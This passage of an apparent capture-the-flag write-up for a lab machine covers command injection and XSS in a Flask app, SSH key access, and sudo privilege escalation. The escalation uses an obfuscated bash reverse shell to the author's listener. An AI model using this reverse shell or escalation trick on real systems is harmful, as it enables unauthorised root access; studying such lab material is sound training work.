+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"&lt;"</span> <span class="token keyword">in</span> message <span class="token keyword">and</span> <span class="token string">">"</span> <span class="token keyword">in</span> message<span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token punctuation">(</span><span class="token string">"{{"</span> <span class="token keyword">in</span> message <span class="token keyword">and</span> <span class="token string">"}}"</span> <span class="token keyword">in</span> message<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            request_info <span class="token operator">=</span> <span class="token punctuation">{</span>
+                <span class="token string">"Method"</span><span class="token punctuation">:</span> request<span class="token punctuation">.</span>method<span class="token punctuation">,</span>
+                <span class="token string">"URL"</span><span class="token punctuation">:</span> request<span class="token punctuation">.</span>url<span class="token punctuation">,</span>
+                <span class="token string">"Headers"</span><span class="token punctuation">:</span> format_request_info<span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>headers<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+            <span class="token punctuation">}</span>
+
+            formatted_request_info <span class="token operator">=</span> format_request_info<span class="token punctuation">(</span>request_info<span class="token punctuation">)</span>
+            html <span class="token operator">=</span> render_template<span class="token punctuation">(</span><span class="token string">'hackattempt.html'</span><span class="token punctuation">,</span> request_info<span class="token operator">=</span>formatted_request_info<span class="token punctuation">)</span>
+
+            filename <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">{</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">99999999999999999999999</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">.html'</span></span>
+            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>hacking_reports_dir<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> html_file<span class="token punctuation">:</span>
+                html_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span>html<span class="token punctuation">)</span>
+
+            <span class="token keyword">return</span> html
+
+    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'support.html'</span><span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/hacking_reports/&lt;int:report_number>'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">hacking_reports</span><span class="token punctuation">(</span>report_number<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    report_file <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>hacking_reports_dir<span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">{</span>report_number<span class="token punctuation">}</span></span><span class="token string">.html'</span></span><span class="token punctuation">)</span>
+
+    <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>report_file<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> send_file<span class="token punctuation">(</span>report_file<span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string">"Report not found"</span><span class="token punctuation">,</span> <span class="token number">404</span>
+
+<span class="token keyword">def</span> <span class="token function">format_request_info</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    formatted_info <span class="token operator">=</span> <span class="token string">''</span>
+    <span class="token keyword">for</span> key<span class="token punctuation">,</span> value <span class="token keyword">in</span> info<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        formatted_info <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f"&lt;strong></span><span class="token interpolation"><span class="token punctuation">{</span>key<span class="token punctuation">}</span></span><span class="token string">:&lt;/strong> </span><span class="token interpolation"><span class="token punctuation">{</span>value<span class="token punctuation">}</span></span><span class="token string">&lt;br>"</span></span>
+    <span class="token keyword">return</span> formatted_info
+
+<span class="token keyword">def</span> <span class="token function">format_form_data</span><span class="token punctuation">(</span>form_data<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    formatted_data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
+    <span class="token keyword">for</span> key<span class="token punctuation">,</span> value <span class="token keyword">in</span> form_data<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        formatted_data<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> value
+    <span class="token keyword">return</span> formatted_data
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span>
+</span></span></span></code></pre><div id="https://www.notion.so/52463d8f56a645ba97d1b16a8bcb9f35" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Straightaway you can see that the POST data is directly used inside </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">os.popen()</code></span><span class="SemanticString">, hence allowing the command injection attack. </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">report.sh</code></span><span class="SemanticString"> is just a dummy script that echoes “Systems are up and running!”.</span></span></p></div><pre id="https://www.notion.so/7b175c5aa2114aaca9ab7179514c21ac" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>script_output <span class="token operator">=</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'bash report.sh </span><span class="token interpolation"><span class="token punctuation">{</span>date<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span></span></span></span></code></pre><div id="https://www.notion.so/6d5e7d15ade54d21afc21b7f0db80599" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Also, when a hacking attempt is detected, it saves the request info as a dictionary and then passed to a Jinja2 template for rendering.</span></span></p></div><div id="https://www.notion.so/4f0e73da03b543bb8a8c81bce000f55d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1e37be9ec1fd4e8e9da5ebb0ea49c133" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">hackattempt.html</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/6e666628e89f4cf185284e273d73749d" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Hacking Attempt Detected<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">
+        &lt;..SNIP..>
+    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Hacking Attempt Detected<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Your IP address has been flagged, a report with your browser information has been sent to the administrators for investigation.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>strong</span><span class="token punctuation">></span></span>Client Request Information:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>strong</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pre</span><span class="token punctuation">></span></span>{{ request_info | safe}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pre</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></span></span></code></pre><div id="https://www.notion.so/f9d82830e9934e4c97406fe7ebae2de3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">This is the template for the hack report. Interestingly the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">| safe</code></span><span class="SemanticString"> filter is used, which according to </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://semgrep.dev/docs/cheat-sheets/flask-xss">this</a></span><span class="SemanticString">, explicitly disables HTML escaping. We’ll come back to this later.</span></span></p></div><div id="https://www.notion.so/e83acce6704c4eb7ad8df0eaa70739f6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/0729cf716d754114a3b5a345c1bfa726" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">SSH Access:</strong></span></span></p></div><div id="https://www.notion.so/730014f9ddbc4444aad071d7d8853df5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Since port 22 is also open, I’ll use </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ssh-keygen</code></span><span class="SemanticString"> to generate a key pair and add the public key into </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">~/.ssh/authorized_keys</code></span><span class="SemanticString">. Now I can directly log in via SSH for a more stable shell.</span></span></p></div><pre id="https://www.notion.so/a326762bcb524172b2c40b2c7a662f92" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/headless]
+└─$</span></mark></span><span class="SemanticString"><span> ssh dvir@10.129.32.248 -i ssh_key          
+
+Warning: Permanently added &#x27;10.129.32.248&#x27; (ED25519) to the list of known hosts.
+Linux headless 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+You have mail.
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>dvir@headless:~$</span></mark></span></span></code></pre><div id="https://www.notion.so/8d14b8be56b94de5877f942e12075672" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">First thing I noticed is “You have mail”. It can be found in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/var/mail</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/b69460cb88a6433399169dea4f3db011" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>dvir@headless:/var/mail$</span></mark></span><span class="SemanticString"><span> ls -la
+
+total 12
+drwxrwsr-x  2 root mail 4096 Sep 10  2023 .
+drwxr-xr-x 11 root root 4096 Sep  9  2023 ..
+-rw-r--r--  1 root mail  772 Sep 10  2023 dvir
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>dvir@headless:/var/mail$</span></mark></span><span class="SemanticString"><span> cat dvir
+
+Subject: Important Update: New System Check Script
+
+Hello!
+
+We have an important update regarding our server. In response to recent compatibility and crashing issues, we&#x27;ve introduced a new system check script.
+
+What&#x27;s special for you?
+- You&#x27;ve been granted special privileges to use this script.
+- It will help identify and resolve system issues more efficiently.
+- It ensures that necessary updates are applied when needed.
+
+Rest assured, this script is at your disposal and won&#x27;t affect your regular use of the system.
+
+If you have any questions or notice anything unusual, please don&#x27;t hesitate to reach out to us. We&#x27;re here to assist you with any concerns.
+
+By the way, we&#x27;re still waiting on you to create the database initialization script!
+Best regards,
+Headless</span></span></span></code></pre><div id="https://www.notion.so/904d5efe8ee040d8b2c25448607c17c4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The phrasing is a bit funny, but it essentially suggests that the user has sudo rights to run a script.</span></span></p></div><div id="https://www.notion.so/9a72c79f7ac646628ac65d93aacc6ab4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/aafca44b106347e4838bcb8dbfdc3781" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Sudo Rights:</strong></span></span></p></div><pre id="https://www.notion.so/230ec3bf2d5046f4a9984584d73c8b90" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>dvir@headless:~$</span></mark></span><span class="SemanticString"><span> sudo -l
+
+Matching Defaults entries for dvir on headless:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User dvir may run the following commands on headless:
+    (ALL) NOPASSWD: /usr/bin/syscheck</span></span></span></code></pre><div id="https://www.notion.so/21fb30b3fd3b46ad9bd633955450a851" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">As expected, the user can run </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/usr/bin/syscheck</code></span><span class="SemanticString"> with sudo.</span></span></p></div><div id="https://www.notion.so/e63bc60085ee4dcbb6a8bfac76ddb133" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/9122f00ae77e4b49b7a13bfe97b2ca07" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/usr/bin/syscheck</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/d63964f5dd1b425e82fe0adfd9d2da7d" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token shebang important">#!/bin/bash</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token environment constant">$EUID</span>"</span> <span class="token parameter variable">-ne</span> <span class="token number">0</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
+  <span class="token builtin class-name">exit</span> <span class="token number">1</span>
+<span class="token keyword">fi</span>
+
+<span class="token assign-left variable">last_modified_time</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>/usr/bin/find /boot <span class="token parameter variable">-name</span> <span class="token string">'vmlinuz*'</span> <span class="token parameter variable">-exec</span> <span class="token function">stat</span> <span class="token parameter variable">-c</span> %Y <span class="token punctuation">{</span><span class="token punctuation">}</span> + <span class="token operator">|</span> /usr/bin/sort <span class="token parameter variable">-n</span> <span class="token operator">|</span> /usr/bin/tail <span class="token parameter variable">-n</span> <span class="token number">1</span><span class="token variable">)</span></span>
+<span class="token assign-left variable">formatted_time</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>/usr/bin/date <span class="token parameter variable">-d</span> <span class="token string">"@<span class="token variable">$last_modified_time</span>"</span> +<span class="token string">"%d/%m/%Y %H:%M"</span><span class="token variable">)</span></span>
+/usr/bin/echo <span class="token string">"Last Kernel Modification Time: <span class="token variable">$formatted_time</span>"</span>
+
+<span class="token assign-left variable">disk_space</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>/usr/bin/df <span class="token parameter variable">-h</span> / <span class="token operator">|</span> /usr/bin/awk <span class="token string">'NR==2 {print $4}'</span><span class="token variable">)</span></span>
+/usr/bin/echo <span class="token string">"Available disk space: <span class="token variable">$disk_space</span>"</span>
+
+<span class="token assign-left variable">load_average</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>/usr/bin/uptime <span class="token operator">|</span> /usr/bin/awk -F<span class="token string">'load average:'</span> <span class="token string">'{print $2}'</span><span class="token variable">)</span></span>
+/usr/bin/echo <span class="token string">"System load average: <span class="token variable">$load_average</span>"</span>
+
+<span class="token keyword">if</span> <span class="token operator">!</span> /usr/bin/pgrep <span class="token parameter variable">-x</span> <span class="token string">"initdb.sh"</span> <span class="token operator">&amp;></span>/dev/null<span class="token punctuation">;</span> <span class="token keyword">then</span>
+  /usr/bin/echo <span class="token string">"Database service is not running. Starting it..."</span>
+  ./initdb.sh <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
+<span class="token keyword">else</span>
+  /usr/bin/echo <span class="token string">"Database service is running."</span>
+<span class="token keyword">fi</span>
+
+<span class="token builtin class-name">exit</span> <span class="token number">0</span></span></span></span></code></pre><div id="https://www.notion.so/1256a633d833478aae41fd429d96efa4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The script can be broken down into the following 3 steps:</span></span></p></div><ol class="NumberedListWrapper"><li id="https://www.notion.so/2077d5a9bd4d44e0adaccabdd8a3b33e" class="NumberedList" value="1"><span class="SemanticStringArray"><span class="SemanticString">It first checks if it’s been run by </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">root</code></span><span class="SemanticString">, it exits if not.</span></span></li><li id="https://www.notion.so/366325c513a240cca32e561b9cf0887d" class="NumberedList" value="2"><span class="SemanticStringArray"><span class="SemanticString">Then it reports several other checks such as kernel modification time and disk space</span></span></li><li id="https://www.notion.so/71b83f8d143341f2843fff157f3208ff" class="NumberedList" value="3"><span class="SemanticStringArray"><span class="SemanticString">Finally it checks if </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">initdb.sh</code></span><span class="SemanticString"> is running or not. If not, start the script.</span></span></li></ol><div id="https://www.notion.so/771014da87d845bc9a30f66ba4d67a6e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Notably, the script looks for </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">initdb.sh</code></span><span class="SemanticString"> in the current working directory. Since I’m in a directory I have write access to, I can create </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">initdb.sh</code></span><span class="SemanticString"> that contains a reverse shell payload:</span></span></p></div><pre id="https://www.notion.so/5bb6e9e83b814a11a60207684a028a3b" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token shebang important">#!/bin/bash</span>
+
+<span class="token builtin class-name">echo</span> <span class="token assign-left variable">L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjYyLzgwMDEgMD4mMQ</span><span class="token operator">==</span> <span class="token operator">|</span> base64 <span class="token parameter variable">-d</span> <span class="token operator">|</span> <span class="token function">bash</span></span></span></span></code></pre><div id="https://www.notion.so/1ec1d5cbf71a42d2b7c599deeb53ec13" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll grant the payload execute permissions, and run the sudo command:</span></span></p></div><pre id="https://www.notion.so/3dcdd0506c224fe8af5c2b6da4f64427" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>dvir@headless:~$</span></mark></span><span class="SemanticString"><span> chmod +x initdb.sh 
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>dvir@headless:~$</span></mark></span><span class="SemanticString"><span> sudo syscheck
+
+Last Kernel Modification Time: 01/02/2024 10:05
+Available disk space: 2.0G
+System load average:  0.01, 0.02, 0.00
+Database service is not running. Starting it...</span></span></span></code></pre><div id="https://www.notion.so/62df46d1e7e5432892603fcd613758eb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The script hanged, but a root shell got sent back to my listener:</span></span></p></div><pre id="https://www.notion.so/2c272ab714b74c44a3ab541492e14d45" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/headless]
+└─$</span></mark></span><span class="SemanticString"><span> rlwrap nc -lvnp 8001
+
+listening on [any] 8001 ...
+connect to [10.10.14.62] from (UNKNOWN) [10.129.32.248] 44162
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>root@headless:/home/dvir#</span></mark></span><span class="SemanticString"><span> id
+
+uid=0(root) gid=0(root) groups=0(root)</span></span></span></code></pre><div id="https://www.notion.so/7e5a02c43117432ebb3d8d77badabe86" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/b5a01c72850c430a9982c766ca3a1c2b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Root Flag:</strong></span></span></p></div><pre id="https://www.notion.so/287c808773e749ff981d95c044447cc8" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>root@headless:~#</span></mark></span><span class="SemanticString"><span> cat root.txt
+
+736d8103************************</span></span></span></code></pre><div id="https://www.notion.so/402c7bbd71794ce4835f568341dce712" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/0c04592203644e078a6d92fa2eaa6b44" class="Divider"></div><h3 id="https://www.notion.so/d87de10d50274790af9edebcf6fe765a" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/d87de10d50274790af9edebcf6fe765a"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Post-Exploitation as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">root</code></span><span class="SemanticString">:</span></span></h3><div id="https://www.notion.so/f1a48fa2bed8401cae47e422e225215c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With root access, I now have unrestricted access to the system. As a fun challenge, I’ll attempt to patch the XSS vulnerability in the web app.</span></span></p></div><div id="https://www.notion.so/6780a415ea7645e0a69be4759ce9fbfc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/5cf010ef16a64b339f6841d4347d3a37" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Attempt 1:</strong></span></span></p></div><div id="https://www.notion.so/247efedd31514879870b0a9d90703345" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">As mentioned earlier, </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">| safe</code></span><span class="SemanticString"> explicitly disabled HTML escaping, so theoretically the issue would be fixed by removing this filter in the template:</span></span></p></div><div id="https://www.notion.so/19644073518145ca924161580cc04e45" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/5758f1a3abcc4ecea136064c9ffa57d0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">hackreport.html</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/97be7202934445749f067b049814eeca" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Hacking Attempt Detected<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Your IP address has been flagged, a report with your browser information has been sent to the administrators for investigation.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
